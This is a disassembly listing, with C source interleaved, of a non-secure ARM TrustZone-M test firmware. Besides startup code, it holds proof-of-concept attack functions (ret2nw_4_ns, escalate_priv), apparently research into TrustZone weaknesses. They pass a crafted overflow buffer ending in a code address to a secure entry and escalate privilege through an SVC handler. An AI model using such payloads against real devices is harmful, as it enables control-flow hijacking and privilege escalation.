
TZ-GetStart-NS.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .text         00000488  00008000  00008000  00008000  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  1 .relocate     00000000  20002000  20002000  00008488  2**0
                  CONTENTS
  2 .bss          00000028  20002000  20002000  00012000  2**2
                  ALLOC
  3 .heap         00000200  20002028  20002028  00012000  2**0
                  ALLOC
  4 .stack        00000400  20002228  20002228  00012000  2**0
                  ALLOC
  5 .ARM.attributes 0000002c  00000000  00000000  00008488  2**0
                  CONTENTS, READONLY
  6 .comment      00000059  00000000  00000000  000084b4  2**0
                  CONTENTS, READONLY
  7 .debug_info   00000d78  00000000  00000000  0000850d  2**0
                  CONTENTS, READONLY, DEBUGGING
  8 .debug_abbrev 000004e3  00000000  00000000  00009285  2**0
                  CONTENTS, READONLY, DEBUGGING
  9 .debug_loc    000003a8  00000000  00000000  00009768  2**0
                  CONTENTS, READONLY, DEBUGGING
 10 .debug_aranges 00000110  00000000  00000000  00009b10  2**0
                  CONTENTS, READONLY, DEBUGGING
 11 .debug_ranges 000000c0  00000000  00000000  00009c20  2**0
                  CONTENTS, READONLY, DEBUGGING
 12 .debug_macro  000150e1  00000000  00000000  00009ce0  2**0
                  CONTENTS, READONLY, DEBUGGING
 13 .debug_line   000030eb  00000000  00000000  0001edc1  2**0
                  CONTENTS, READONLY, DEBUGGING
 14 .debug_str    00080537  00000000  00000000  00021eac  2**0
                  CONTENTS, READONLY, DEBUGGING
 15 .debug_frame  000002d4  00000000  00000000  000a23e4  2**2
                  CONTENTS, READONLY, DEBUGGING

Disassembly of section .text:

00008000 <exception_table>:
    8000:	28 26 00 20 75 81 00 00 0b 82 00 00 0b 82 00 00     (&. u...........
	...
    802c:	1f 83 00 00 00 00 00 00 00 00 00 00 0b 82 00 00     ................
    803c:	0b 82 00 00 0b 82 00 00 0b 82 00 00 0b 82 00 00     ................
    804c:	0b 82 00 00 0b 82 00 00 0b 82 00 00 0b 82 00 00     ................
    805c:	0b 82 00 00 0b 82 00 00 0b 82 00 00 0b 82 00 00     ................
    806c:	0b 82 00 00 0b 82 00 00 0b 82 00 00 0b 82 00 00     ................
    807c:	0b 82 00 00 0b 82 00 00 0b 82 00 00 0b 82 00 00     ................
    808c:	0b 82 00 00 0b 82 00 00 0b 82 00 00 0b 82 00 00     ................
    809c:	0b 82 00 00 0b 82 00 00 0b 82 00 00 0b 82 00 00     ................
    80ac:	0b 82 00 00 0b 82 00 00 0b 82 00 00 0b 82 00 00     ................
    80bc:	0b 82 00 00 0b 82 00 00 0b 82 00 00 0b 82 00 00     ................
    80cc:	0b 82 00 00 0b 82 00 00 0b 82 00 00 0b 82 00 00     ................
    80dc:	0b 82 00 00 0b 82 00 00 0b 82 00 00 0b 82 00 00     ................
    80ec:	0b 82 00 00 0b 82 00 00                             ........

000080f4 <__do_global_dtors_aux>:
    80f4:	b510      	push	{r4, lr}
    80f6:	f242 0400 	movw	r4, #8192	; 0x2000
    80fa:	f2c2 0400 	movt	r4, #8192	; 0x2000
    80fe:	7823      	ldrb	r3, [r4, #0]
    8100:	b963      	cbnz	r3, 811c <__do_global_dtors_aux+0x28>
    8102:	f240 0300 	movw	r3, #0
    8106:	f2c0 0300 	movt	r3, #0
    810a:	b12b      	cbz	r3, 8118 <__do_global_dtors_aux+0x24>
    810c:	f248 4088 	movw	r0, #33928	; 0x8488
    8110:	f2c0 0000 	movt	r0, #0
    8114:	e000      	b.n	8118 <__do_global_dtors_aux+0x24>
    8116:	bf00      	nop
    8118:	2301      	movs	r3, #1
    811a:	7023      	strb	r3, [r4, #0]
    811c:	bd10      	pop	{r4, pc}
    811e:	46c0      	nop			; (mov r8, r8)

00008120 <frame_dummy>:
    8120:	f240 0300 	movw	r3, #0
    8124:	f2c0 0300 	movt	r3, #0
    8128:	b510      	push	{r4, lr}
    812a:	b14b      	cbz	r3, 8140 <frame_dummy+0x20>
    812c:	f242 0104 	movw	r1, #8196	; 0x2004
    8130:	f248 4088 	movw	r0, #33928	; 0x8488
    8134:	f2c2 0100 	movt	r1, #8192	; 0x2000
    8138:	f2c0 0000 	movt	r0, #0
    813c:	e000      	b.n	8140 <frame_dummy+0x20>
    813e:	bf00      	nop
    8140:	f248 4088 	movw	r0, #33928	; 0x8488
    8144:	f2c0 0000 	movt	r0, #0
    8148:	6803      	ldr	r3, [r0, #0]
    814a:	b903      	cbnz	r3, 814e <frame_dummy+0x2e>
    814c:	bd10      	pop	{r4, pc}
    814e:	f240 0300 	movw	r3, #0
    8152:	f2c0 0300 	movt	r3, #0
    8156:	2b00      	cmp	r3, #0
    8158:	d0f8      	beq.n	814c <frame_dummy+0x2c>
    815a:	4798      	blx	r3
    815c:	e7f6      	b.n	814c <frame_dummy+0x2c>
    815e:	46c0      	nop			; (mov r8, r8)

00008160 <atmel_start_init>:

/**
 * Initializes MCU, drivers and middleware in the project
 **/
void atmel_start_init(void)
{
    8160:	b580      	push	{r7, lr}
    8162:	af00      	add	r7, sp, #0
	system_init();
    8164:	f248 2311 	movw	r3, #33297	; 0x8211
    8168:	f2c0 0300 	movt	r3, #0
    816c:	4798      	blx	r3
}
    816e:	46c0      	nop			; (mov r8, r8)
    8170:	46bd      	mov	sp, r7
    8172:	bd80      	pop	{r7, pc}

00008174 <Reset_Handler>:
/**
 * \brief This is the code that gets called on processor reset.
 * To initialize the device, and call the main() routine.
 */
void Reset_Handler(void)
{
    8174:	b580      	push	{r7, lr}
    8176:	b082      	sub	sp, #8
    8178:	af00      	add	r7, sp, #0
        uint32_t *pSrc, *pDest;

        /* Initialize the relocate segment */
        pSrc = &_etext;
    817a:	f248 4388 	movw	r3, #33928	; 0x8488
    817e:	f2c0 0300 	movt	r3, #0
    8182:	607b      	str	r3, [r7, #4]
        pDest = &_srelocate;
    8184:	f242 0300 	movw	r3, #8192	; 0x2000
    8188:	f2c2 0300 	movt	r3, #8192	; 0x2000
    818c:	603b      	str	r3, [r7, #0]

        if (pSrc != pDest) {
    818e:	687a      	ldr	r2, [r7, #4]
    8190:	683b      	ldr	r3, [r7, #0]
    8192:	429a      	cmp	r2, r3
    8194:	d00f      	beq.n	81b6 <Reset_Handler+0x42>
                for (; pDest < &_erelocate;) {
    8196:	e007      	b.n	81a8 <Reset_Handler+0x34>
                        *pDest++ = *pSrc++;
    8198:	683b      	ldr	r3, [r7, #0]
    819a:	1d1a      	adds	r2, r3, #4
    819c:	603a      	str	r2, [r7, #0]
    819e:	687a      	ldr	r2, [r7, #4]
    81a0:	1d11      	adds	r1, r2, #4
    81a2:	6079      	str	r1, [r7, #4]
    81a4:	6812      	ldr	r2, [r2, #0]
    81a6:	601a      	str	r2, [r3, #0]
                for (; pDest < &_erelocate;) {
    81a8:	683a      	ldr	r2, [r7, #0]
    81aa:	f242 0300 	movw	r3, #8192	; 0x2000
    81ae:	f2c2 0300 	movt	r3, #8192	; 0x2000
    81b2:	429a      	cmp	r2, r3
    81b4:	d3f0      	bcc.n	8198 <Reset_Handler+0x24>
                }
        }

        /* Clear the zero segment */
        for (pDest = &_szero; pDest < &_ezero;) {
    81b6:	f242 0300 	movw	r3, #8192	; 0x2000
    81ba:	f2c2 0300 	movt	r3, #8192	; 0x2000
    81be:	603b      	str	r3, [r7, #0]
    81c0:	e004      	b.n	81cc <Reset_Handler+0x58>
                *pDest++ = 0;
    81c2:	683b      	ldr	r3, [r7, #0]
    81c4:	1d1a      	adds	r2, r3, #4
    81c6:	603a      	str	r2, [r7, #0]
    81c8:	2200      	movs	r2, #0
    81ca:	601a      	str	r2, [r3, #0]
        for (pDest = &_szero; pDest < &_ezero;) {
    81cc:	683a      	ldr	r2, [r7, #0]
    81ce:	f242 0328 	movw	r3, #8232	; 0x2028
    81d2:	f2c2 0300 	movt	r3, #8192	; 0x2000
    81d6:	429a      	cmp	r2, r3
    81d8:	d3f3      	bcc.n	81c2 <Reset_Handler+0x4e>
        }

        /* Set the vector table base address */
        pSrc = (uint32_t *) & _sfixed;
    81da:	f248 0300 	movw	r3, #32768	; 0x8000
    81de:	f2c0 0300 	movt	r3, #0
    81e2:	607b      	str	r3, [r7, #4]
        SCB->VTOR = ((uint32_t) pSrc & SCB_VTOR_TBLOFF_Msk);
    81e4:	f64e 5300 	movw	r3, #60672	; 0xed00
    81e8:	f2ce 0300 	movt	r3, #57344	; 0xe000
    81ec:	687a      	ldr	r2, [r7, #4]
    81ee:	217f      	movs	r1, #127	; 0x7f
    81f0:	438a      	bics	r2, r1
    81f2:	609a      	str	r2, [r3, #8]

        /* Initialize the C library */
        __libc_init_array();
    81f4:	f248 4309 	movw	r3, #33801	; 0x8409
    81f8:	f2c0 0300 	movt	r3, #0
    81fc:	4798      	blx	r3

        /* Branch to main function */
        main();
    81fe:	f248 231b 	movw	r3, #33307	; 0x821b
    8202:	f2c0 0300 	movt	r3, #0
    8206:	4798      	blx	r3

        /* Infinite loop */
        while (1);
    8208:	e7fe      	b.n	8208 <Reset_Handler+0x94>

0000820a <Dummy_Handler>:

/**
 * \brief Default interrupt handler for unused IRQs.
 */
void Dummy_Handler(void)
{
    820a:	b580      	push	{r7, lr}
    820c:	af00      	add	r7, sp, #0
        while (1) {
    820e:	e7fe      	b.n	820e <Dummy_Handler+0x4>

00008210 <system_init>:
	return 0;
}
#endif

void system_init(void)
{
    8210:	b580      	push	{r7, lr}
    8212:	af00      	add	r7, sp, #0
#if (defined(__ARM_FEATURE_CMSE) && (__ARM_FEATURE_CMSE == 3U))
	/* Only initialize MCU clock when the project is TrustZone secure project  */
	init_mcu();
#endif
}
    8214:	46c0      	nop			; (mov r8, r8)
    8216:	46bd      	mov	sp, r7
    8218:	bd80      	pop	{r7, pc}

0000821a <main>:

volatile int gs_val[2];

/* Non-secure main() */
int main(void)
{
    821a:	b580      	push	{r7, lr}
    821c:	b082      	sub	sp, #8
    821e:	af00      	add	r7, sp, #0
	/* Initializes MCU, drivers and middleware */
	atmel_start_init();
    8220:	f248 1361 	movw	r3, #33121	; 0x8161
    8224:	f2c0 0300 	movt	r3, #0
    8228:	4798      	blx	r3
	
	int status;
	status = pass_nsfunc_ptr_o_int_i_void(&get_driver_status);
    822a:	f248 3369 	movw	r3, #33641	; 0x8369
    822e:	f2c0 0300 	movt	r3, #0
    8232:	0018      	movs	r0, r3
    8234:	f647 4311 	movw	r3, #31761	; 0x7c11
    8238:	f2c0 0300 	movt	r3, #0
    823c:	4798      	blx	r3
    823e:	0003      	movs	r3, r0
    8240:	607b      	str	r3, [r7, #4]
	
	if (status!=0) {
    8242:	687b      	ldr	r3, [r7, #4]
    8244:	b10b      	cbz	r3, 824a <main+0x30>
		__BKPT(0);
    8246:	be00      	bkpt	0x0000
		while(1);
    8248:	e7fe      	b.n	8248 <main+0x2e>
	}
	
	DROP_NS_PRIVILEGES;
    824a:	2301      	movs	r3, #1
    824c:	f383 8814 	msr	CONTROL, r3
// 	ret2nw_ns();
// 	ret2nw_2_ns();
// 	ret2nw_3_ns();
	ret2nw_4_ns();
    8250:	f248 3381 	movw	r3, #33665	; 0x8381
    8254:	f2c0 0300 	movt	r3, #0
    8258:	4798      	blx	r3
	
	/* Call non-secure callable function 1 */
	gs_val[0] = nsc_func_plus3(1);
    825a:	2001      	movs	r0, #1
    825c:	f647 4301 	movw	r3, #31745	; 0x7c01
    8260:	f2c0 0300 	movt	r3, #0
    8264:	4798      	blx	r3
    8266:	0002      	movs	r2, r0
    8268:	f242 0320 	movw	r3, #8224	; 0x2020
    826c:	f2c2 0300 	movt	r3, #8192	; 0x2000
    8270:	601a      	str	r2, [r3, #0]

	/* Call non-secure callable function 2 */
	gs_val[1] = nsc_func_minus2(7);
    8272:	2007      	movs	r0, #7
    8274:	f647 4309 	movw	r3, #31753	; 0x7c09
    8278:	f2c0 0300 	movt	r3, #0
    827c:	4798      	blx	r3
    827e:	0002      	movs	r2, r0
    8280:	f242 0320 	movw	r3, #8224	; 0x2020
    8284:	f2c2 0300 	movt	r3, #8192	; 0x2000
    8288:	605a      	str	r2, [r3, #4]

	/* Replace with your application code */
	while (1) {
		__NOP();
    828a:	46c0      	nop			; (mov r8, r8)
    828c:	e7fd      	b.n	828a <main+0x70>

0000828e <SVC_Handler_Main>:
void print_in_s_handler(char* content);
void print_chk_in_s_handler(char* content);
void func_up_ns(void);

void SVC_Handler_Main(uint32_t exc_return_code, uint32_t msp_val)
{
    828e:	b580      	push	{r7, lr}
    8290:	b088      	sub	sp, #32
    8292:	af00      	add	r7, sp, #0
    8294:	6078      	str	r0, [r7, #4]
    8296:	6039      	str	r1, [r7, #0]
	uint32_t stack_frame_addr;
	unsigned int *svc_args;
	uint8_t svc_number;
	char* stacked_r0;
	// Determines which stack pointer was used
	if (exc_return_code & 0x4) stack_frame_addr = __get_PSP();
    8298:	687b      	ldr	r3, [r7, #4]
    829a:	2204      	movs	r2, #4
    829c:	4013      	ands	r3, r2
    829e:	b12b      	cbz	r3, 82ac <SVC_Handler_Main+0x1e>
 */
__STATIC_FORCEINLINE uint32_t __get_PSP(void)
{
  uint32_t result;

  __ASM volatile ("MRS %0, psp"  : "=r" (result) );
    82a0:	f3ef 8309 	mrs	r3, PSP
    82a4:	60fb      	str	r3, [r7, #12]
  return(result);
    82a6:	68fb      	ldr	r3, [r7, #12]
    82a8:	61fb      	str	r3, [r7, #28]
    82aa:	e001      	b.n	82b0 <SVC_Handler_Main+0x22>
	else stack_frame_addr = msp_val;
    82ac:	683b      	ldr	r3, [r7, #0]
    82ae:	61fb      	str	r3, [r7, #28]
	// Determines whether additional state context is present
	if (exc_return_code & 0x20) {
    82b0:	687b      	ldr	r3, [r7, #4]
    82b2:	2220      	movs	r2, #32
    82b4:	4013      	ands	r3, r2
    82b6:	b113      	cbz	r3, 82be <SVC_Handler_Main+0x30>
		svc_args = (unsigned *) stack_frame_addr;}
    82b8:	69fb      	ldr	r3, [r7, #28]
    82ba:	61bb      	str	r3, [r7, #24]
    82bc:	e002      	b.n	82c4 <SVC_Handler_Main+0x36>
	else {// additional state context present (only for Secure SVC)
		svc_args = (unsigned *) (stack_frame_addr+40);}
    82be:	69fb      	ldr	r3, [r7, #28]
    82c0:	3328      	adds	r3, #40	; 0x28
    82c2:	61bb      	str	r3, [r7, #24]
	// extracts SVC number
	svc_number = ((char *) svc_args[6])[-2]; // Memory[(stacked_pc)-2]
    82c4:	69bb      	ldr	r3, [r7, #24]
    82c6:	3318      	adds	r3, #24
    82c8:	681b      	ldr	r3, [r3, #0]
    82ca:	3b02      	subs	r3, #2
    82cc:	001a      	movs	r2, r3
    82ce:	2317      	movs	r3, #23
    82d0:	18fb      	adds	r3, r7, r3
    82d2:	7812      	ldrb	r2, [r2, #0]
    82d4:	701a      	strb	r2, [r3, #0]
	stacked_r0 = (char *) svc_args[0];
    82d6:	69bb      	ldr	r3, [r7, #24]
    82d8:	681b      	ldr	r3, [r3, #0]
    82da:	613b      	str	r3, [r7, #16]
	switch (svc_number)
    82dc:	2317      	movs	r3, #23
    82de:	18fb      	adds	r3, r7, r3
    82e0:	781b      	ldrb	r3, [r3, #0]
    82e2:	2b01      	cmp	r3, #1
    82e4:	d00b      	beq.n	82fe <SVC_Handler_Main+0x70>
    82e6:	2b02      	cmp	r3, #2
    82e8:	d011      	beq.n	830e <SVC_Handler_Main+0x80>
    82ea:	b103      	cbz	r3, 82ee <SVC_Handler_Main+0x60>
			break;
		case 2:
			SET_NS_PRIVILEGES;
			break;
		default:
			break;
    82ec:	e013      	b.n	8316 <SVC_Handler_Main+0x88>
			print_in_s_handler(stacked_r0);
    82ee:	693b      	ldr	r3, [r7, #16]
    82f0:	0018      	movs	r0, r3
    82f2:	f248 3327 	movw	r3, #33575	; 0x8327
    82f6:	f2c0 0300 	movt	r3, #0
    82fa:	4798      	blx	r3
			break;
    82fc:	e00b      	b.n	8316 <SVC_Handler_Main+0x88>
			print_chk_in_s_handler(stacked_r0);
    82fe:	693b      	ldr	r3, [r7, #16]
    8300:	0018      	movs	r0, r3
    8302:	f248 334b 	movw	r3, #33611	; 0x834b
    8306:	f2c0 0300 	movt	r3, #0
    830a:	4798      	blx	r3
			break;
    830c:	e003      	b.n	8316 <SVC_Handler_Main+0x88>
			SET_NS_PRIVILEGES;
    830e:	2300      	movs	r3, #0
    8310:	f383 8814 	msr	CONTROL, r3
			break;
    8314:	46c0      	nop			; (mov r8, r8)
	}
}
    8316:	46c0      	nop			; (mov r8, r8)
    8318:	46bd      	mov	sp, r7
    831a:	b008      	add	sp, #32
    831c:	bd80      	pop	{r7, pc}

0000831e <SVCall_Handler>:

void __attribute__((naked)) SVC_Handler(void)
{
	__asm volatile(
    831e:	4670      	mov	r0, lr
    8320:	4669      	mov	r1, sp
    8322:	e7b4      	b.n	828e <SVC_Handler_Main>
		"mov r0, lr\n\t"
		"mov r1, sp\n\t"
		"b      SVC_Handler_Main\n\t"
	);
}
    8324:	46c0      	nop			; (mov r8, r8)

00008326 <print_in_s_handler>:
/**
 * \brief BXNS - IPSR
 */

void print_in_s_handler(char* content)
{
    8326:	b580      	push	{r7, lr}
    8328:	b082      	sub	sp, #8
    832a:	af00      	add	r7, sp, #0
    832c:	6078      	str	r0, [r7, #4]
	print_nsc(content);
    832e:	687b      	ldr	r3, [r7, #4]
    8330:	0018      	movs	r0, r3
    8332:	f647 4321 	movw	r3, #31777	; 0x7c21
    8336:	f2c0 0300 	movt	r3, #0
    833a:	4798      	blx	r3
}
    833c:	46c0      	nop			; (mov r8, r8)
    833e:	46bd      	mov	sp, r7
    8340:	b002      	add	sp, #8
    8342:	bd80      	pop	{r7, pc}

00008344 <func_up_ns>:
	print_in_s_ns(user_input);
	func_up_ns();
}

void func_up_ns()
{
    8344:	b580      	push	{r7, lr}
    8346:	af00      	add	r7, sp, #0
	while(1)
    8348:	e7fe      	b.n	8348 <func_up_ns+0x4>

0000834a <print_chk_in_s_handler>:
/**
 * \brief BLXNS - IPSR
 */

void print_chk_in_s_handler(char* content)
{
    834a:	b580      	push	{r7, lr}
    834c:	b082      	sub	sp, #8
    834e:	af00      	add	r7, sp, #0
    8350:	6078      	str	r0, [r7, #4]
	print_chk_nsc(content);
    8352:	687b      	ldr	r3, [r7, #4]
    8354:	0018      	movs	r0, r3
    8356:	f647 4319 	movw	r3, #31769	; 0x7c19
    835a:	f2c0 0300 	movt	r3, #0
    835e:	4798      	blx	r3
}
    8360:	46c0      	nop			; (mov r8, r8)
    8362:	46bd      	mov	sp, r7
    8364:	b002      	add	sp, #8
    8366:	bd80      	pop	{r7, pc}

00008368 <get_driver_status>:
	print_chk_in_s_ns(user_input);
	func_up_ns();
}

int get_driver_status()
{
    8368:	b580      	push	{r7, lr}
    836a:	af00      	add	r7, sp, #0
	return 0;
    836c:	2300      	movs	r3, #0
}
    836e:	0018      	movs	r0, r3
    8370:	46bd      	mov	sp, r7
    8372:	bd80      	pop	{r7, pc}

00008374 <escalate_priv>:
/**
 * \brief BXNS - CONTROL.nPRIV
 */

void escalate_priv()
{
    8374:	b580      	push	{r7, lr}
    8376:	af00      	add	r7, sp, #0
	__asm volatile("svc #2");
    8378:	df02      	svc	2
}
    837a:	46c0      	nop			; (mov r8, r8)
    837c:	46bd      	mov	sp, r7
    837e:	bd80      	pop	{r7, pc}

00008380 <ret2nw_4_ns>:
/**
 * \brief BXNS - CONTROL.nPRIV
 */

void ret2nw_4_ns()
{
    8380:	b580      	push	{r7, lr}
    8382:	b088      	sub	sp, #32
    8384:	af00      	add	r7, sp, #0
	char user_input[32] = {\
    8386:	003b      	movs	r3, r7
    8388:	0018      	movs	r0, r3
    838a:	2320      	movs	r3, #32
    838c:	001a      	movs	r2, r3
    838e:	2100      	movs	r1, #0
    8390:	f248 4359 	movw	r3, #33881	; 0x8459
    8394:	f2c0 0300 	movt	r3, #0
    8398:	4798      	blx	r3
    839a:	003b      	movs	r3, r7
    839c:	2220      	movs	r2, #32
    839e:	701a      	strb	r2, [r3, #0]
    83a0:	003b      	movs	r3, r7
    83a2:	2220      	movs	r2, #32
    83a4:	705a      	strb	r2, [r3, #1]
    83a6:	003b      	movs	r3, r7
    83a8:	2220      	movs	r2, #32
    83aa:	709a      	strb	r2, [r3, #2]
    83ac:	003b      	movs	r3, r7
    83ae:	2220      	movs	r2, #32
    83b0:	70da      	strb	r2, [r3, #3]
    83b2:	003b      	movs	r3, r7
    83b4:	2221      	movs	r2, #33	; 0x21
    83b6:	711a      	strb	r2, [r3, #4]
    83b8:	003b      	movs	r3, r7
    83ba:	2221      	movs	r2, #33	; 0x21
    83bc:	715a      	strb	r2, [r3, #5]
    83be:	003b      	movs	r3, r7
    83c0:	2221      	movs	r2, #33	; 0x21
    83c2:	719a      	strb	r2, [r3, #6]
    83c4:	003b      	movs	r3, r7
    83c6:	2221      	movs	r2, #33	; 0x21
    83c8:	71da      	strb	r2, [r3, #7]
    83ca:	003b      	movs	r3, r7
    83cc:	2244      	movs	r2, #68	; 0x44
    83ce:	721a      	strb	r2, [r3, #8]
    83d0:	003b      	movs	r3, r7
    83d2:	2283      	movs	r2, #131	; 0x83
    83d4:	725a      	strb	r2, [r3, #9]
		0x20,0x20,0x20,0x20,\
		0x21,0x21,0x21,0x21,\
		0x44,0x83,0x00,0x00};
	escalate_priv();
    83d6:	f248 3375 	movw	r3, #33653	; 0x8375
    83da:	f2c0 0300 	movt	r3, #0
    83de:	4798      	blx	r3
	print_chk_nsc(user_input);
    83e0:	003b      	movs	r3, r7
    83e2:	0018      	movs	r0, r3
    83e4:	f647 4319 	movw	r3, #31769	; 0x7c19
    83e8:	f2c0 0300 	movt	r3, #0
    83ec:	4798      	blx	r3
	DROP_NS_PRIVILEGES;
    83ee:	2301      	movs	r3, #1
    83f0:	f383 8814 	msr	CONTROL, r3
	func_up_ns();
    83f4:	f248 3345 	movw	r3, #33605	; 0x8345
    83f8:	f2c0 0300 	movt	r3, #0
    83fc:	4798      	blx	r3
    83fe:	46c0      	nop			; (mov r8, r8)
    8400:	46bd      	mov	sp, r7
    8402:	b008      	add	sp, #32
    8404:	bd80      	pop	{r7, pc}
	...

00008408 <__libc_init_array>:
    8408:	b570      	push	{r4, r5, r6, lr}
    840a:	2500      	movs	r5, #0
    840c:	4b0e      	ldr	r3, [pc, #56]	; (8448 <__libc_init_array+0x40>)
    840e:	4c0f      	ldr	r4, [pc, #60]	; (844c <__libc_init_array+0x44>)
    8410:	1ae4      	subs	r4, r4, r3
    8412:	10a4      	asrs	r4, r4, #2
    8414:	42a5      	cmp	r5, r4
    8416:	d109      	bne.n	842c <__libc_init_array+0x24>
    8418:	2500      	movs	r5, #0
    841a:	f000 f825 	bl	8468 <_init>
    841e:	4c0c      	ldr	r4, [pc, #48]	; (8450 <__libc_init_array+0x48>)
    8420:	4b0c      	ldr	r3, [pc, #48]	; (8454 <__libc_init_array+0x4c>)
    8422:	1ae4      	subs	r4, r4, r3
    8424:	10a4      	asrs	r4, r4, #2
    8426:	42a5      	cmp	r5, r4
    8428:	d107      	bne.n	843a <__libc_init_array+0x32>
    842a:	bd70      	pop	{r4, r5, r6, pc}
    842c:	4a06      	ldr	r2, [pc, #24]	; (8448 <__libc_init_array+0x40>)
    842e:	00ab      	lsls	r3, r5, #2
    8430:	189b      	adds	r3, r3, r2
    8432:	681b      	ldr	r3, [r3, #0]
    8434:	4798      	blx	r3
    8436:	3501      	adds	r5, #1
    8438:	e7ec      	b.n	8414 <__libc_init_array+0xc>
    843a:	4a06      	ldr	r2, [pc, #24]	; (8454 <__libc_init_array+0x4c>)
    843c:	00ab      	lsls	r3, r5, #2
    843e:	189b      	adds	r3, r3, r2
    8440:	681b      	ldr	r3, [r3, #0]
    8442:	4798      	blx	r3
    8444:	3501      	adds	r5, #1
    8446:	e7ee      	b.n	8426 <__libc_init_array+0x1e>
    8448:	00008474 	.word	0x00008474
    844c:	00008474 	.word	0x00008474
    8450:	00008478 	.word	0x00008478
    8454:	00008474 	.word	0x00008474

00008458 <memset>:
    8458:	0003      	movs	r3, r0
    845a:	1882      	adds	r2, r0, r2
    845c:	4293      	cmp	r3, r2
    845e:	d100      	bne.n	8462 <memset+0xa>
    8460:	4770      	bx	lr
    8462:	7019      	strb	r1, [r3, #0]
    8464:	3301      	adds	r3, #1
    8466:	e7f9      	b.n	845c <memset+0x4>

00008468 <_init>:
    8468:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
    846a:	46c0      	nop			; (mov r8, r8)
    846c:	bcf8      	pop	{r3, r4, r5, r6, r7}
    846e:	bc08      	pop	{r3}
    8470:	469e      	mov	lr, r3
    8472:	4770      	bx	lr

00008474 <__init_array_start>:
    8474:	00008121 	.word	0x00008121

00008478 <_fini>:
    8478:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
    847a:	46c0      	nop			; (mov r8, r8)
    847c:	bcf8      	pop	{r3, r4, r5, r6, r7}
    847e:	bc08      	pop	{r3}
    8480:	469e      	mov	lr, r3
    8482:	4770      	bx	lr

00008484 <__fini_array_start>:
    8484:	000080f5 	.word	0x000080f5
